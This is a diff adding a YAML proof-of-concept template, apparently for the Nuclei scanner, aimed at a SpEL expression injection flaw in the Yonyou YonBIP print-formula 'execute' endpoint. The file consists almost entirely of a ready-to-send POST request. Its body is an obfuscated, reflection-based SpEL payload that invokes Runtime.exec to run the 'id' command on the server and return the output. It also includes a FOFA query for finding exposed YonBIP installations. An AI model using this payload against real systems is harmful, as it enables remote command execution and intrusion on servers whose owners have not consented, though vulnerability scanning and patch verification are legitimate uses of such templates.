@@ -1,0 +1,19 @@
+id: poc-ombe9pu85abu1psl
+info:
+  name: 用友YonBIP execute 接口存在Spel表达式注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ombe9pu85abu1psl'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ombe9pu85abu1psl
+    fofa: app="用友-YonBIP"
+http:
+- raw:
+  - "POST /iuap-apcom-print/iuap-print/rest/formula/execute HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip\nContent-Type: application/json\nCookie: _WorkbenchCross_=Ultraman\nUser-Agent: Mozilla/5.0 (Windows NT6.1;MHhzZWNs) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.617.73 Safari/537.36\n\n{\n  \"formulaExpression\": \"1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.util.Scanner').getConstructor(1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.io.InputStream')).newInstance(1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec', 'a'.getClass()).invoke(1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.lang.Runtime').getMethod('getRuntime').invoke(null), 'id').getInputStream()).useDelimiter('\\\\\\\\A').next()\"\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
